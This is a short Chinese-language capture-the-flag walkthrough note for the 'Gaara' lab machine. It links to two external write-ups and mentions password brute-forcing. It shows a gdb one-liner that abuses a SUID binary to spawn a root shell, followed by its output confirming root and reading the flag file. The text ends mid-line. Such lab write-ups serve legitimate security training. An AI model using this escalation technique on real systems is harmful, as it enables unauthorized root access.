[http://192.168.142.142/Cryoserver](http://192.168.142.142/Cryoserver)  
参考资料  
[https://medium.com/@rizzziom/gaara-walkthrough-proving-gounds-474a07f3a709](https://medium.com/@rizzziom/gaara-walkthrough-proving-gounds-474a07f3a709)
 
[https://medium.com/@jamesjarviscyber/gaara-write-up-provinggrounds-vulnhub-0168a5beb32e](https://medium.com/@jamesjarviscyber/gaara-write-up-provinggrounds-vulnhub-0168a5beb32e)
       
爆破密码
 
提权 拿到shell权限之后 二次进行开发  
$ gdb -nx -ex 'python import os;os.execl("/bin/sh","sh","-p")' -ex quit  
GNU gdb (Debian 8.2.1-2+b3) 8.2.1  
Copyright (C) 2018 Free Software Foundation, Inc.  
License GPLv3+: GNU GPL version 3 or later \<[http://gnu.org/licenses/gpl.html](http://gnu.org/licenses/gpl.html)\>  
This is free software: you are free to change and redistribute it.  
There is NO WARRANTY, to the extent permitted by law.  
Type "show copying" and "show warranty" for details.  
This GDB was configured as "x86_64-linux-gnu".  
Type "show configuration" for configuration details.  
For bug reporting instructions, please see:  
\<[http://www.gnu.org/software/gdb/bugs/](http://www.gnu.org/software/gdb/bugs/)\>.  
Find the GDB manual and other documentation resources online at:  
\<[http://www.gnu.org/software/gdb/documentation/](http://www.gnu.org/software/gdb/documentation/)\>.
 
For help, type "help".  
Type "apropos word" to search for commands related to "word".  
# id  
uid=1001(gaara) gid=1001(gaara) euid=0(root) egid=0(root) groups=0(root),1001(gaara)  
# whoami  
root  
# cd /root  
# ls  
proof.txt root.txt  
# cat proof.txt  
b1d08acc881ab92210d45f0fd9240a8b  
# ls  
proof.txt root.txt  
# cat root.txt  
Your flag is in another file...  
# cat proof.txt  
b